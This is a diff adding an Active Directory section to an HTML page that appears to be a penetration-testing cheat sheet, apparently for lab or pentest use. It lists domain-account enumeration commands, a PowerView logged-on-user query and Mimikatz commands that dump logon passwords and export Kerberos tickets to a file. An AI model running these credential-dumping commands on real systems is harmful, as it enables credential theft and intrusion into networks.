@@ -470,8 +470,44 @@ rpcclient $> exit
 <p id="info"></p>
 <p id="codebox"></p>
 
+<hr>
 
-Setup Port Forwarding - Option 1
+<h1>Active Directory</h1>
+
+<p id="info"></p>
+<p id="codebox"><b>Get local accounts</b><br>
+    net user<br>
+    <b>Get domain accounts</b><br>
+    net user /domain<br>
+
+
+</p>
+
+
+<p id="info">Get Domain Name for the currently logged in user</p>
+<p id="codebox"> PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+</p>
+
+
+<p id="info">Get Currently Logged on Users</p>
+<p id="codebox">
+    Import-Module .\PowerView.ps1 <br>
+    Get-NetLoggedon -ComputerName $TARGET #Target doesn't have to be machine we're currently on <br>
+
+<p id="info">Mimikatz</p>
+<p id="codebox">
+log hash.txt<br>
+privilege::debug<br>
+sekurlsa::logonpasswords<br>
+sekurlsa::tickets<br>
+kerberos::list /export
+    </p>
+    
+
+</p>
+
+<p id="info"></p>
+<p id="codebox"></p>
 
 
 
